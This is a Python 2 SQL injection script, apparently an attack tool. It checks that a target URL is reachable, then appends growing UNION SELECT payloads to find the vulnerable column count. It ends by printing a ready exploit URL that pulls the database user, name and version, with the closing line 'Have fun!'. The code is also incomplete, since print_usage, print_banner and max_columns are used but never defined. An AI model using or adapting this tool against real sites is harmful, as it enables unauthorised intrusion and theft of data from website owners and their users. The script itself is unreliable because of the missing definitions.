#!/usr/bin/python



import sys,  re,  urllib,  urllib2,  string
from urllib2 import Request, urlopen, URLError, HTTPError

# Define the max. amounts for trying



# Testing if URL is reachable, with error handling
def test_url():
    print ">> Checking if connection can be established..."
    try:
        response = urllib2.urlopen(provided_url)
    except HTTPError,  e:
        print ">> The connection could not be established."
        print ">> Error code: ",  e.code
        print ">> Exiting now!"
        print ""
        sys.exit(1)
    except URLError,  e:
        print ">> The connection could not be established."
        print ">> Reason: ",  e.reason
        print ">> Exiting now!"
        print ""
        sys.exit(1)
    else:
        valid_target = 1
        print ">> Connected to target! URL seems to be valid."
        print ""
    return

# Find correct amount of columns for the SQL Injection
def find_columns():
    # Define some important variables and make the script a little bit dynamic
    number_of_columns = 1
    column_finder_url_string = "+AND+1=2+UNION+SELECT+"
    column_finder_url_message = "0x503077337220743020743368206330777321"
    column_finder_url_message_plain = "P0w3r t0 t3h c0ws!"
    column_finder_url_terminator = "--"
    next_column = ","
    column_finder_url_sample = "concat(user(),database(),version())"
    
    print ">> Trying to find the correct number of columns..."
    
    # Craft the final URL to check
    final_check_url = provided_url+column_finder_url_string+column_finder_url_message 
    
    for x in xrange(1, max_columns):
        # Visit website and store response source code of site
        final_check_url2 = final_check_url+column_finder_url_terminator 
        response = urllib2.urlopen(final_check_url2)
        html = response.read()
        find_our_injected_string = re.findall(column_finder_url_message_plain, html)
        
        # When the correct amount was found we display the information and exit
        if len(find_our_injected_string) != 0:
            print ">> Correct number of columns found!"
            print ">> Amount: ",  number_of_columns
            
            # Ask if a sample URL should be provided
            user_reply = str(raw_input(">> Do you want to have a sample URL for exploiting? (Yes/No) "))
            if user_reply == "Y" or user_reply == "y" or user_reply == "Yes" or user_reply == "yes":
                print ""
                
                # Print a sample URL for exploiting and replace test string with some useful stuff
                print string.replace(final_check_url2, column_finder_url_message, column_finder_url_sample)
                print ""
                print "Simply copy and paste this link into your browser :) Have fun! Bye :)"
                print ""
                print ""
                sys.exit(1)
                
            else:
                print ">> Ok, bye =)"
                print ""
                print ""
                sys.exit(1)
                
        
        # Increment counter var by one
        number_of_columns  += 1
        
        #Add a new column to the URL
        final_check_url += next_column
        final_check_url += column_finder_url_message         
     
    # If fuzzing is not successfull print this message 
    print ">> Fuzzing was not successfull. Maybe the target is not vulnerable?"
    

# Checking if argument was provided
if len(sys.argv) <=1:
    print_usage()
    sys.exit(1)
    
for arg in sys.argv:
    # Checking if help was called
    if arg == "--help":
        print_usage()
        sys.exit(1)
    
    # Checking if  URL was provided, if yes -> go!
    if arg == "-u":
        provided_url = sys.argv[2]
        print_banner()
        
        # At first we test if we can actually reach the provided URL
        test_url()
        
        # Now start with finding the correct amount of columns
        find_columns()
        
        print ""
        print ""
    
### EOF ###
